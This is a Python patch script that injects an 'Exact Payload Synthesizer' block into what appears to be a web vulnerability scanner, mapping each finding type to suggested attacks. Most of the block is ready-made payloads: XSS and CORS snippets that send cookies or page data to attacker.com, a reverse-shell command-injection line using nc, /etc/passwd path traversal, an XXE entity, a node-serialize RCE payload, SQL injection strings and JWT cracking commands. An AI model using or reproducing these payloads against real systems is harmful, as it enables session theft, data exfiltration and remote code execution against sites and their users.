import re

with open('core/live_browser.py', 'r') as f:
    content = f.read()

new_block = """        # Build Exact Payload Synthesizer based on specific raw finding types
        specific_suggestions = {}
        for f in self.live_findings:
            t = f.get('type', '')
            if 'MISSING_CONTENT_SECURITY_POLICY' in t or 'CSP_MISSING' in t or 'MISSING_CSP' in t:
                specific_suggestions['CSP'] = {
                    'title': '🛡️ No CSP — Any XSS is Fully Exploitable',
                    'color': '#ff3333',
                    'text': '- <strong>Vulnerability:</strong> No Content-Security-Policy header on any page.<br>- <strong>Impact:</strong> The browser executes ANY injected script — inline, external, or via data: URI.<br>- <strong>Attack Strategy:</strong> Prioritize finding Reflected/Stored XSS. Without CSP there is zero secondary defense.<br>- <strong>Classic Payloads:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;script&gt;alert(document.domain)&lt;/script&gt;<br>&lt;img src=x onerror=alert(1)&gt;<br>&lt;svg/onload=fetch(`https://attacker.com/?c=${document.cookie}`)&gt;</code>'
                }
            elif 'MISSING_X_FRAME_OPTIONS' in t or 'X_FRAME' in t:
                specific_suggestions['CLICKJACKING'] = {
                    'title': '🖼️ Clickjacking — Missing X-Frame-Options',
                    'color': '#ff9900',
                    'text': '- <strong>Vulnerability:</strong> Pages can be embedded in a &lt;iframe&gt; on an attacker site.<br>- <strong>Attack:</strong> Overlay a transparent iframe over a fake UI to trick users into clicking sensitive actions (fund transfers, account deletion, password change).<br>- <strong>PoC (Clickjacking Test):</strong><br><code style="color:#ffaa00; background:#111; padding:2px; display:block; margin:4px 0;">&lt;style&gt;iframe{opacity:0.5;position:absolute;top:0;left:0;width:100%;height:100%;z-index:99}&lt;/style&gt;<br>&lt;iframe src="TARGET_URL"&gt;&lt;/iframe&gt;</code>'
                }
            elif 'MISSING_X_CONTENT_TYPE_OPTIONS' in t or 'X_CONTENT_TYPE' in t:
                specific_suggestions['MIME'] = {
                    'title': '📄 MIME Sniffing — Missing X-Content-Type-Options',
                    'color': '#ffff00',
                    'text': '- <strong>Vulnerability:</strong> Browser may MIME-sniff responses and execute them differently.<br>- <strong>Attack Vector:</strong> If you can upload a file with polyglot content (e.g. an image that is also valid JS/HTML), the browser may execute it as script.<br>- <strong>Strategy:</strong> Test file upload endpoints with polyglot payloads:<br><code style="color:#ffff66; background:#111; padding:2px; display:block; margin:4px 0;">GIF89a/*&lt;script&gt;alert(1)&lt;/script&gt;*/</code>'
                }
            elif 'MISSING_PERMISSIONS_POLICY' in t or 'PERMISSIONS_POLICY' in t:
                specific_suggestions['PERMISSIONS'] = {
                    'title': '🎤 Missing Permissions-Policy (Camera/Mic/Geolocation)',
                    'color': '#ffff00',
                    'text': '- <strong>Vulnerability:</strong> No Permissions-Policy restricts browser APIs.<br>- <strong>Impact:</strong> Malicious iframes or XSS payloads can silently request camera, microphone, geolocation, or payment access.<br>- <strong>Combined with XSS:</strong><br><code style="color:#ffff66; background:#111; padding:2px; display:block; margin:4px 0;">navigator.geolocation.getCurrentPosition(p=>fetch(`https://attacker.com/?lat=${p.coords.latitude}&lng=${p.coords.longitude}`))</code>'
                }
            elif 'MISSING_REFERRER_POLICY' in t or 'REFERRER_POLICY' in t:
                specific_suggestions['REFERRER'] = {
                    'title': '🔗 Sensitive URL Leakage — Missing Referrer-Policy',
                    'color': '#ffff00',
                    'text': '- <strong>Vulnerability:</strong> The full URL (including query params) is sent in the Referer header to external sites.<br>- <strong>Leak Scenarios:</strong><br>• User visits /account?token=abc123 → clicks external link → token leaked in Referer<br>• Password reset tokens, session IDs in URLs → leaked to third-party analytics<br>- <strong>Recommendation:</strong> Add Referrer-Policy: strict-origin-when-cross-origin'
                }
            elif 'CORS_WILDCARD' in t:
                specific_suggestions['CORS'] = {
                    'title': '🚪 CORS Wildcard Abuse (Access-Control-Allow-Origin: *)',
                    'color': '#ff9900',
                    'text': '- <strong>Vulnerability:</strong> Any origin can read responses from this API.<br>- <strong>Constraint:</strong> Browsers block credentials (cookies/Auth headers) with wildcard ACAO. Useful for exfiltrating unauthenticated or session-independent data.<br>- <strong>Exploit (host on attacker server):</strong><br><code style="color:#ffaa00; background:#111; padding:2px; display:block; margin:4px 0;">&lt;script&gt;<br>  fetch("TARGET_URL")<br>    .then(r => r.text())<br>    .then(d => fetch("https://attacker.com/log?d=" + btoa(d)));<br>&lt;/script&gt;</code>'
                }
            elif 'JSON_WEB_TOKEN' in t or 'JWT_TOKEN' in t:
                specific_suggestions['JWT'] = {
                    'title': '🔑 JWT Found — Test for Algorithm Confusion & Weak Secrets',
                    'color': '#ff3333',
                    'text': '- <strong>Finding:</strong> JWT token detected in traffic/response.<br>- <strong>Test 1 — Algorithm: none attack:</strong> Decode the JWT (base64), change "alg":"HS256" to "alg":"none", strip the signature. If accepted → critical auth bypass.<br>- <strong>Test 2 — Weak secret brute-force:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">hashcat -a 0 -m 16500 &lt;jwt&gt; wordlist.txt<br>python3 jwt_tool.py &lt;jwt&gt; -C -d wordlist.txt</code><br>- <strong>Test 3 — RS256 → HS256 confusion:</strong> Sign with the server\\'s public key as the HS256 secret → server may accept it.'
                }
            elif 'CONFIRMED_RUNTIME_DOM_SINK_FUNCTION_CTOR' in t or 'DOM_XSS_NEW_FUNCTION' in t or 'EVAL' in t:
                specific_suggestions['DOM_XSS_EVAL'] = {
                    'title': '🌐 Confirmed DOM XSS — Function() Constructor / Eval Sink',
                    'color': '#ff3333',
                    'text': '- <strong>Vulnerability:</strong> Data flows into new Function() or eval().<br>- <strong>Payloads (break out of any surrounding string context):</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">alert(1) (direct injection)<br>\\\\");alert(1);// (string escape)<br>\\\'}-alert(1)-x={ (object context)</code><br>- <strong>Data exfil:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">fetch(`https://attacker.com/?d=${btoa(document.cookie)}`)</code>'
                }
            elif 'CONFIRMED_RUNTIME_DOM_SINK_INNERHTML' in t or 'DOM_XSS_INNERHTML' in t or 'DOM_XSS_OUTERHTML' in t or 'DOM_XSS_DOC_WRITE' in t or 'OUTERHTML' in t:
                specific_suggestions['DOM_XSS_HTML'] = {
                    'title': '🌐 Confirmed DOM XSS — HTML Parser Sink',
                    'color': '#ff3333',
                    'text': '- <strong>Vulnerability:</strong> Untrusted data flows into HTML parser sink.<br>- <strong>Constraint:</strong> &lt;script&gt; tags do NOT execute via innerHTML. Use event-handler elements.<br>- <strong>Payloads:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;img src=x onerror=alert(document.domain)&gt;<br>&lt;svg/onload=alert(1)&gt;<br>&lt;details/open/ontoggle=alert(1)&gt;</code><br>- <strong>Cookie steal:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">&lt;img src=x onerror=fetch(`//attacker.com?c=${document.cookie}`)&gt;</code>'
                }
            elif 'COMMAND_INJECTION_NODE' in t:
                specific_suggestions['COMMAND_INJECTION'] = {
                    'title': '💀 Command Injection — Node.js os.exec',
                    'color': '#ff0000',
                    'text': '- <strong>Vulnerability:</strong> Untrusted data is concatenated into a shell command.<br>- <strong>Impact:</strong> Remote Code Execution (RCE). Full system compromise.<br>- <strong>Payloads:</strong><br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">; id<br>| whoami<br>`cat /etc/passwd`<br>$(nc attacker.com 4444 -e /bin/bash)</code>'
                }
            elif 'PATH_TRAVERSAL_NODE' in t:
                specific_suggestions['PATH_TRAVERSAL'] = {
                    'title': '📁 Path Traversal / LFI',
                    'color': '#ff6600',
                    'text': '- <strong>Vulnerability:</strong> Untrusted input controls file paths.<br>- <strong>Impact:</strong> Read arbitrary files from the filesystem.<br>- <strong>Payloads:</strong><br><code style="color:#ffaa66; background:#111; padding:2px; display:block; margin:4px 0;">../../../../../../etc/passwd<br>..%2f..%2f..%2f..%2fetc%2fpasswd<br>....//....//....//etc//passwd</code>'
                }
            elif 'XXE_DOMPARSER' in t:
                specific_suggestions['XXE'] = {
                    'title': '📜 XML External Entity (XXE)',
                    'color': '#ff6600',
                    'text': '- <strong>Vulnerability:</strong> Insecure XML parser allows external entities.<br>- <strong>Impact:</strong> Read local files, SSRF, or denial of service.<br>- <strong>Payload:</strong><br><pre style="color:#ffaa66; background:#111; padding:6px; margin:4px 0; font-size:10px;">&lt;?xml version="1.0"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</pre>'
                }
            elif 'INSECURE_DESERIALIZATION_NODE' in t or 'INSECURE_DESERIALIZATION_EVAL' in t:
                specific_suggestions['DESERIALIZATION'] = {
                    'title': '🔥 Insecure Deserialization',
                    'color': '#ff0000',
                    'text': '- <strong>Vulnerability:</strong> Untrusted data is deserialized directly.<br>- <strong>Impact:</strong> Remote Code Execution (RCE).<br>- <strong>Strategy:</strong> In Node.js (e.g. node-serialize), craft IIFE functions that execute upon deserialization.<br><code style="color:#ff6666; background:#111; padding:2px; display:block; margin:4px 0;">{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(e,s,SE){console.log(s)});}()"}</code>'
                }
            elif 'CLIENT_SIDE_SQLI' in t or 'WEBSQL_INJECTION' in t:
                specific_suggestions['SQLI'] = {
                    'title': '💉 Client-Side SQL Injection',
                    'color': '#ff6600',
                    'text': '- <strong>Vulnerability:</strong> Untrusted data concatenated into WebSQL/SQLite queries.<br>- <strong>Impact:</strong> Local data leakage or modification.<br>- <strong>Payloads:</strong><br><code style="color:#ffaa66; background:#111; padding:2px; display:block; margin:4px 0;">\' OR 1=1--<br>" UNION SELECT * FROM sensitive_table--</code>'
                }
            elif 'OPEN_REDIRECT_LOCATION' in t:
                specific_suggestions['OPEN_REDIRECT'] = {
                    'title': '↪️ DOM-based Open Redirect',
                    'color': '#ffcc00',
                    'text': '- <strong>Vulnerability:</strong> `location.href` or similar sink is assigned untrusted data from `location.hash` or `location.search`.<br>- <strong>Impact:</strong> Phishing, token leakage, or XSS (via javascript: URIs).<br>- <strong>Payloads:</strong><br><code style="color:#ffff66; background:#111; padding:2px; display:block; margin:4px 0;">https://attacker.com<br>//attacker.com<br>javascript:alert(1)</code>'
                }"""

start_str = "        # Build Exact Payload Synthesizer based on specific raw finding types"
end_str = "        if not specific_suggestions:"

start_idx = content.find(start_str)
end_idx = content.find(end_str)

new_content = content[:start_idx] + new_block + '\n' + content[end_idx:]

with open('core/live_browser.py', 'w') as f:
    f.write(new_content)
